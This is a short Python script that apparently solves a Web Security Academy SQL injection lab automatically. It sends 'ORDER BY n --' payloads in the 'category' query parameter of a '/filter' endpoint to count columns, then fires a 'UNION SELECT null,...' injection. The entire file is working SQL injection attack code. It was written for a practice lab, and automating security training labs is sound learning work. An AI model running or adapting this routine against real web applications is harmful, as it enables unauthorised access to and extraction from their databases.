from web_security_academy.core.utils import *


def solve_lab(session):
    path = "/filter"
    print_info("Determining the number of columns...")

    num_columns = 0
    i = 1
    while True:
        params = {"category": f"' ORDER BY {i} --"}
        resp = session.get_path(path, params=params)
        print_info_secondary(f"{params} => {resp.status_code}")
        if resp.status_code == 500:
            break
        else:
            num_columns += 1
            i += 1
    print_success(f"There are {num_columns} columns.\n")

    # Construct columns string
    columns = ["null"] * num_columns
    columns = ", ".join(columns)
    params = {"category": f"' UNION SELECT {columns} --"}

    print_info(
        f'Performing SQL injection UNION attack by visiting "{path}" with the following parameters:'
    )
    print(params)

    session.get_path(path, params=params)
    print_success("SQL injection UNION attack performed.\n")
